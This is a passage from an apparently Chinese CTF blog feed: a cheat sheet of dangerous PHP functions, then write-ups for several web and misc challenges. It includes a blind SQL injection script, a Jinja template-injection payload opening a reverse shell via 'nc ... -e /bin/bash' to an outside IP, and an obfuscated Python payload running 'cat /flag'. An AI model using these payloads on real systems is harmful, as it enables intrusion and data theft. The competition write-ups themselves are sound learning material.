class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">call_user_func (<span class="string">'func'</span>,$arge);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p>函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">array_map(<span class="string">'func'</span>,$arge);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p>用回调函数过滤数组中的单元</p><p><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></p><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">array_filter (<span class="string">'func'</span>,$arge);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk"></a>array_walk</h4><p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。(同时传两个键名和键值参数)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunction</span><span class="params">($value,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The key $key has the value $value&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"red"</span>,<span class="string">"b"</span>=&gt;<span class="string">"green"</span>,<span class="string">"c"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">array_walk($a,<span class="string">"myfunction"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h4><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">$a[<span class="number">1</span>]=<span class="string">'phpinfo()'</span>;</span><br><span class="line">usort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h4><p>uasort — 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">$a[<span class="number">1</span>]=<span class="string">'phpinfo()'</span>;</span><br><span class="line">uasort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="FFI-cdef"><a href="#FFI-cdef" class="headerlink" title="FFI::cdef"></a>FFI::cdef</h4><p>创建一个新的FFI对象,可以把c语言的函数声明出来。以调用c语言system函数为例。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(<span class="string">"int system(const char *command);"</span>);//创建一个system对象</span><br><span class="line">$a=<span class="string">'ls &gt; 1.txt'</span>;//没有回显的</span><br><span class="line">$ffi-&gt;system($a);//通过$ffi去调用system函数</span><br></pre></td></tr></table></figure><h2 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h2><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>system — 执行外部程序，并且显示输出.如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。成功则返回命令输出的最后一行， 失败则返回 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">system(<span class="string">'commande'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>exec() 执行 command 参数所指定的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> exec (<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。反引号（’’`commande`“）的本质是shell_exec。</p><p>(当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULL)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> shell_exec (<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php对文件系统处理函数"><a href="#php对文件系统处理函数" class="headerlink" title="php对文件系统处理函数"></a>php对文件系统处理函数</h2><h4 id="ini-set"><a href="#ini-set" class="headerlink" title="ini_set"></a>ini_set</h4><p>对php.ini文件里的一些对PHP_INI_USER or PHP_INI_ALL 的配置进行临时的更改.</p><p>常见的更改:</p><ol><li><p><strong>include_path</strong> :当寻找要包含的文件时，PHP会分别考虑包含路径中的每个条目。它将检查第一个路径，如果找不到，则检查下一个路径，直到找到包含的文件或返回带有E_WARNING 或的为止 E_ERROR。</p></li><li><p><strong>open_basedir</strong>:当脚本尝试访问文件系统时，例如使用 include或fopen（），将检查文件的位置。当文件在指定的目录树之外时，PHP将拒绝访问它。(自PHP 5.2.16和5.3.4起， 用open_basedir指定的限制是目录名。以前的版本将其用作前缀。这意味着“ open_basedir = /dir/incl”还允许访问“ /dir/include”和“ /dir/incls”（如果存在）。当您只想限制对指定目录的访问时，请以斜杠结尾。例如： open_basedir = /dir/incl/)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> ini_set(<span class="string">'tage'</span><span class="string">'vlue'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="set-include-path"><a href="#set-include-path" class="headerlink" title="set_include_path"></a>set_include_path</h4><p>专门设置<strong>include_path</strong>路径的函数。</p><h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir"></a>chdir</h4><p>将 更改当前目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> chdir(<span class="string">'dir'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h4><p>scandir — 列出指定路径中的文件和目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">scandir ( <span class="string">'dir'</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>highlight_file — 语法高亮一个文件.(可以处理协议)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">highlight_file(<span class="string">'file'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h4><p>highlight_file函数的别名，具体用法同highlight_file。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">show_source(<span class="string">'file'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.exec.php</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10819069.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届上海市大学生网络安全大赛-初赛wp</title>
      <link href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/"/>
      <url>/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>周末去打了下上海市，虽然有的是原题魔改但感觉有点题还是有点意思，故书之。<a id="more"></a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h3><p>从<code>www.zip</code>获得了原码。审查原码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>, <span class="string">'_POST'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)</span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">if</span>($$key) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$key <span class="keyword">as</span> $key_2 =&gt; $value_2) &#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($$key_2) <span class="keyword">and</span> $$key_2 == $value_2) </span><br><span class="line"><span class="keyword">unset</span>($$key_2); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) $_POST[<span class="string">'code'</span>] = $pan-&gt;filter($_POST[<span class="string">'code'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$message = $pan-&gt;getfile();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;div class="alert alert-dismissable alert-info"&gt;</span></span><br><span class="line"><span class="string"> &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;×&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;h4&gt;</span></span><br><span class="line"><span class="string">注意!</span></span><br><span class="line"><span class="string">&lt;/h4&gt; &lt;strong&gt;注意!&lt;/strong&gt; <span class="subst">&#123;$message&#125;</span></span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有可以变量覆盖绕过waf。及get提交一个<code>_POST[&#39;code&#39;]</code> 就可以让post中code覆盖掉。(注意编码就行。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://eci-2zeikzil0vb2fhx1hg0q.cloudeci1.ichunqiu.com/index.php?_POST[code]='</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"eci-2ze5g0l1bms27122px6b.cloudeci1.ichunqiu.com"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctf</span></span><br><span class="line"><span class="comment">#file,flag</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">max = <span class="number">255</span></span><br><span class="line">min = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min)&gt;<span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">pay = <span class="string">"233333' and if(ascii(substr((select flag from flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i,mid)</span><br><span class="line">data = &#123;<span class="string">"code"</span>: pay&#125;</span><br><span class="line">pay2 = <span class="string">"233333' and if(ascii(substr((select flag from flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23"</span>.format(i,mid)</span><br><span class="line">r = requests.post(url=url+pay2,data=data,headers=headers)</span><br><span class="line"><span class="comment"># print url+pay</span></span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line"><span class="comment"># print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'http://127.0.0.1/2333.gif'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">res += chr(max)</span><br><span class="line"><span class="keyword">if</span> chr(max) <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h3 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h3><p>进入题目,根据提示得到了原码.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'/flag'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">"name"</span>) <span class="keyword">or</span> <span class="string">""</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/help',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    help = <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">'rm -f /flag'</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">"name"</span>) <span class="keyword">or</span> <span class="string">""</span></span><br><span class="line">    <span class="comment"># r = request.path</span></span><br><span class="line">    r = request.data.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">'popen'</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">'&#123;&#123;'</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">" Not found!"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">" Not found!"</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>@app.errorhandler(404)</code>有ssti。</p><p>先访问不存在页面，然后抓包修改为post传参即可绕过page_no_found，然后过滤了一些关键字，字符拼接和’{  %’。由于是无回显，且删除了flag。推测’在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag）在/proc/[pid]/fd下还是会存在’的考点，尝试反弹shell，在进程里面找到flag。最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%if &#39;p&#39;+&#39;open&#39;&#x3D;&#x3D;os[&#39;p&#39;+&#39;open&#39;](&#39;nc 39.100.119.234 8080 -t -e &#x2F;bin&#x2F;bash&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>{echo,ZmxhZ3t3MzFjMG1lNX0=}|{base64,-d}|{tr,5,6} 分析这段代码，怀疑是linux 的命令结果理解，解base64后，将5替换成6.即得到flag。</p><h3 id="pcap-analysis"><a href="#pcap-analysis" class="headerlink" title="pcap analysis"></a>pcap analysis</h3><p>对Modbus协议进行追踪，在分析Modbus协议写寄存器的数据数据时发现 ：</p><p><img src="image-20201115183623046.png" alt="image-20201115183623046">s</p><p>拼接后即得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-show_原谅杯wp</title>
      <link href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/"/>
      <url>/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>趁着双十一嘛,在集训的时候摸鱼去原谅杯看了看</p><a id="more"></a><h2 id="原谅1"><a href="#原谅1" class="headerlink" title="原谅1"></a>原谅1</h2><p>进入题目看到的就是一张抽象图片.</p><p><img src="image-20201112124008591.png" alt="image-20201112124008591"></p><p>推测应该暗示压缩包密码,前几位推测是<code>1317</code>后面不知道于是采用掩码攻击.</p><p>得到密码后提取压缩包得到一个1.jpg.用stegsolve找到flag.</p><p><img src="image-20201112124424057.png" alt="image-20201112124424057"></p><h2 id="原谅2"><a href="#原谅2" class="headerlink" title="原谅2"></a>原谅2</h2><p>考的是文件隐写与火星文加密.</p><p>用binwalk 提前压缩包,发现出了个hint.txt</p><p><img src="image-20201112122935678.png" alt="image-20201112122935678"></p><p>打开发现疑似有火星文加密.</p><p>解密:<code>佛曰wohsftc学废了适就是压缩包的key</code>(之前刚做的时,把wohsftc倒置了,结果发现不用倒置)</p><p>用解出的密码,解压压缩包就得到了flag</p><h2 id="原谅3"><a href="#原谅3" class="headerlink" title="原谅3"></a>原谅3</h2><p>一个php的rce但是过滤了很多读取文件的命令,最后发现可以用php来读取出来.(php tql!)</p><p><img src="image-20201112124830058.png" alt="image-20201112124830058"></p><h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>进入发现是个python的远程rce,但过滤了不少.而且返回值类型还有了限制.</p><p>偶然间发现dir函数还没被过滤.执行查看.</p><p><img src="image-20201112115723078.png" alt="image-20201112115723078"></p><p>发现有一个奇怪的变量<code>kiword</code>,查看一下发现了’chr’字符串</p><p><img src="image-20201112115753581.png" alt="image-20201112115753581"></p><p>由于有dir()函数在,推测环境中<code>__builtins__</code>及其类中含有的方法也在环境中.</p><p>所以尝试用getattr方法绕waf获得flag.</p><p>经过尝试通过<code>getattr(__builtins__,kiword)</code>获得了chr函数</p><p>再通过chr函数拼接出更多的字符串.再利用getattr方法套娃来构造:</p><p><code>__import__(&quot;os&quot;).popen().read</code></p><p>从而获得对面的shell来读取flag.</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x3D;getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(99)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(32)+getattr(__builtins__,kiword)(47)+getattr(__builtins__,kiword)(102)+getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(103)).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> mics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-show 1024杯</title>
      <link href="/2020/10/26/ctf-show%201024%E6%9D%AF/"/>
      <url>/2020/10/26/ctf-show%201024%E6%9D%AF/</url>
      
